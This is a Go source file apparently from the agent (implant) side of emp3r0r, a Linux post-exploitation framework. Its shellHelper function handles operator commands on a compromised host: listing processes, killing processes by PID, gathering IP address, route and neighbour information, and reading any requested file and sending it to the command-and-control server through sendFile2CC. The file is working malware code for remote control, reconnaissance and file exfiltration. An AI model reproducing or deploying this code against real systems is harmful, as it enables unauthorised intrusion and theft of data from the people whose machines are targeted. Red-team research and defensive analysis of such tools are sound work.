package agent

// build +linux

import (
	"encoding/json"
	"fmt"
	"log"
	"os"
	"strconv"
	"strings"

	"github.com/jm33-m0/emp3r0r/core/lib/tun"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

// shellHelper ps and kill and other helpers
func shellHelper(cmdSlice []string) (out string) {
	cmd := cmdSlice[0]
	args := cmdSlice[1:]
	var (
		err        error
		get_params struct {
			Path   string `json:"path"`
			Offset int64  `json:"offset"`
			Token  string `json:"token"`
		}
	)

	switch cmd {
	case "#ps":
		out, err = shellPs()
		if err != nil {
			out = fmt.Sprintf("Failed to ps: %v", err)
		}
	case "#kill":
		out, err = shellKill(args)
		if err != nil {
			out = fmt.Sprintf("Failed to kill: %v", err)
		}
	case "#net":
		out = shellNet()
	case "#get":
		params_json_str := strings.Join(args, " ")
		err = json.Unmarshal([]byte(params_json_str), &get_params)
		filepath := get_params.Path
		offset := get_params.Offset
		token := get_params.Token
		log.Printf("File download: %s at %d with token %s", filepath, offset, token)
		err = sendFile2CC(filepath, offset, token)
		out = fmt.Sprintf("%s has been sent, please check", filepath)
		if err != nil {
			log.Printf("#GET: %v", err)
			out = filepath + err.Error()
		}
	default:
		out = "Unknown helper"
	}

	return
}

func shellNet() (out string) {
	ipa := tun.IPa()
	ipneigh := tun.IPNeigh()
	ipr := tun.IPr()

	out = fmt.Sprintf("[*] ip addr:\n    %s"+
		"\n\n[*] ip route:\n    %s"+
		"\n\n[*] ip neigh:\n    %s\n\n",
		strings.Join(ipa, ", "),
		strings.Join(ipr, ", "),
		strings.Join(ipneigh, ", "))

	return
}

func shellKill(args []string) (out string, err error) {
	var (
		pid  int
		proc *os.Process
	)
	for _, pidStr := range args {
		pid, err = strconv.Atoi(pidStr)
		if err != nil {
			return
		}
		proc, err = os.FindProcess(pid)
		if err != nil {
			return
		}

		// kill process
		err = proc.Kill()
		if err != nil {
			out = fmt.Sprintf("%s\nfailed to kill %d: %v", out, pid, err)
			return
		}
		out = fmt.Sprintf("%s\nsuccessfully killed %d", out, pid)
	}
	return
}

func shellPs() (out string, err error) {
	out = "Failed to get process list"
	procs := util.ProcessList()
	if procs == nil {
		return out, fmt.Errorf("error: %s", out)
	}

	data, err := json.Marshal(procs)
	if err != nil {
		return
	}
	out = string(data)

	return
}
